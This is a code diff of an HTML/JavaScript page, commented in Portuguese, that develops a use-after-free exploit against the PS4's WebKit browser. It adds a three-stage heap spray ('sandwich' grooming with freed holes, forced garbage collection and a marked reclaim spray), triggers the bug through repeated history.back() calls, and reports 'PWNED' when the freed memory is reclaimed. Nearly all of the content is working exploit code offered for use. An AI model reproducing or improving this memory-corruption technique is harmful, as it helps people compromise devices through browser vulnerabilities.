@@ -2,30 +2,30 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit - Buffer + GC Strategy</title>
+<title>PS4 WebKit - Sandwich Strategy</title>
 <style>
     body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
     button { 
         padding: 20px; width: 100%; margin-bottom: 10px;
         font-weight: bold; font-size: 16px; cursor: pointer; 
-        border: 2px solid #0f0; background: #003300; color: #fff;
+        border: 2px solid #0f0; background: #002200; color: #fff;
         text-transform: uppercase;
     }
     #log { border: 1px solid #555; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 350px; overflow-y: scroll;}
 </style>
 </head>
 <body>
-<h2>PS4 WebKit - Buffer Spray + GC (Non-Blocking)</h2>
-<div id="status">Pronto.</div>
+<h2>PS4 WebKit - 3-Step Spray (Sandwich Strategy)</h2>
+<div id="status">Aguardando...</div>
 
-<button onclick="runStableExploit()">INICIAR RECLAIM (ESTÁVEL)</button>
+<button onclick="runSandwichExploit()">INICIAR ATAQUE SANDUÍCHE</button>
 
 <div id="log"></div>
 
 <script>
 const logEl = document.getElementById("log");
 const statusEl = document.getElementById("status");
-function log(m) { 
+function log(m, type="") { 
     const d = document.createElement("div");
     d.textContent = m;
     logEl.appendChild(d);
@@ -33,26 +33,52 @@ function log(m) {
 }
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-var keepAlive = [];
+var grooming = []; // Spray 1
+var attack = [];   // Spray 3
 
-// TÉCNICA DO PSFREE.MJS: Função de Garbage Collection
-// Isso é essencial para limpar a memória "suja" e permitir a realocação
+// TÉCNICA PSFREE: GC para limpar e organizar
 function forceGC() {
     for (let i = 0; i < 2; i++) {
-        // Aloca 4MB temporários para forçar o WebKit a limpar o lixo
         new Uint8Array(4 * 1024 * 1024);
     }
 }
 
-async function runStableExploit() {
+async function runSandwichExploit() {
     logEl.innerHTML = "";
-    keepAlive = []; 
-    statusEl.innerText = "Rodando...";
+    grooming = [];
+    attack = [];
+    statusEl.innerText = "Preparando...";
 
     const TARGET_SIZE = 340356;
     
-    log(`1. Alvo fixado: ${TARGET_SIZE} bytes.`);
-    log("2. Disparando UAF...");
+    // === PASSO 1: PRE-SPRAY (GROOMING) ===
+    // Enchemos o Heap com "paredes" para evitar que o buraco mude de tamanho
+    log("1. [SPRAY 1] Preparando o terreno (Grooming)...");
+    
+    const GROOM_COUNT = 1000;
+    for(let i=0; i<GROOM_COUNT; i++) {
+        // Usamos ArrayBuffer para ser idêntico ao alvo final
+        let buf = new ArrayBuffer(TARGET_SIZE);
+        let view = new Uint32Array(buf);
+        view[0] = 0x11111111; // Marcador visual
+        grooming.push({ buf: buf, id: i });
+    }
+    
+    log("2. Criando buracos (Swiss Cheese)...");
+    // Liberamos objetos alternados (pares) para criar espaços onde o UAF vai cair
+    let holes = 0;
+    for(let i=0; i<GROOM_COUNT; i+=2) {
+        grooming[i] = null;
+        holes++;
+    }
+    
+    // Força o GC para efetivar os buracos
+    forceGC();
+    await sleep(100);
+    log(`${holes} buracos preparados para receber o UAF.`);
+
+    // === PASSO 2: TRIGGER UAF (INTACTO) ===
+    log("3. Disparando UAF Original...");
     
     let size = 977;
     const STEP = 14461;
@@ -64,46 +90,48 @@ async function runStableExploit() {
         
         if(i % 6 === 0) setTimeout(() => history.back(), 0);
         
-        // MOMENTO CRÍTICO
+        // MOMENTO DO ATAQUE
         if (i === 47) {
-            log(">>> SPRAY RÁPIDO + GC <<<");
+            log(">>> [SPRAY 3] RECLAIM <<<");
             
-            // 1. Agenda o back() que vai liberar a memória 'V'
+            // Agenda a liberação
             setTimeout(() => history.back(), 0);
             
-            // 2. IMEDIATAMENTE enche a memória com ArrayBuffers
-            // Não usamos loop pesado aqui para não travar a thread
-            doQuickSpray(TARGET_SIZE);
+            // Executa o spray de ataque IMEDIATAMENTE
+            // Como temos "paredes" (os buffers ímpares do grooming), 
+            // o buraco não pode expandir. O spray deve encaixar.
+            doAttackSpray(TARGET_SIZE);
             
-            // 3. Força o GC para garantir que o 'V' suma e o Buffer entre
-            // Isso pode causar uma leve travada, mas é necessária
-            setTimeout(() => forceGC(), 10); 
+            // GC rápido pós-ataque
+            setTimeout(() => forceGC(), 10);
         } else {
             size += STEP;
             await sleep(5);
         }
     }
     
-    // Dá um tempo para o GC rodar e a memória assentar
     await sleep(300);
 
-    // === VERIFICAÇÃO ===
+    // === PASSO 3: VERIFICAÇÃO ===
     checkResult();
 }
 
-function doQuickSpray(size) {
-    // Cria 200 buffers de tamanho exato + variações
-    // ArrayBuffer é alocado nativamente (rápido, não trava a UI)
-    const VARIATIONS = [-32, -16, 0, 16, 32]; // Ajuste fino de header
-    
-    for(let k=0; k<50; k++) { // 50 lotes
-        for(let v of VARIATIONS) {
+function doAttackSpray(size) {
+    // Cria buffers de ataque
+    // Variação pequena (-16 a +16) só por segurança de header
+    for(let delta = -16; delta <= 16; delta += 4) {
+        for(let k=0; k<50; k++) {
             try {
-                let buf = new ArrayBuffer(size + v);
-                let view = new Uint8Array(buf);
-                // Marca o início com 'A' (0x41)
-                view[0] = 0x41; view[1] = 0x41; view[2] = 0x41; view[3] = 0x41;
-                keepAlive.push(buf);
+                let buf = new ArrayBuffer(size + delta);
+                let view = new Uint32Array(buf);
+                // Marcador 'AAAA'
+                view[0] = 0x41414141; 
+                view[1] = 0x41414141;
+                // Preenche o meio também
+                let mid = Math.floor(view.length / 2);
+                view[mid] = 0x41414141;
+                
+                attack.push(buf);
             } catch(e) {}
         }
     }
@@ -126,14 +154,14 @@ function checkResult() {
 
     if(changed) {
         log("!!! JACKPOT !!!");
-        log("Memória Reclamada com Sucesso!");
+        log("Técnica de 3 Sprays funcionou!");
         log(sample);
         statusEl.innerText = "PWNED";
         statusEl.style.backgroundColor = "#0f0";
         statusEl.style.color = "#000";
     } else {
         log("Falha: Ainda vendo 'V'.");
-        log("O GC rodou, mas o buraco ainda está protegido.");
+        log("O UAF pode estar caindo fora dos buracos preparados.");
     }
 }
 </script>
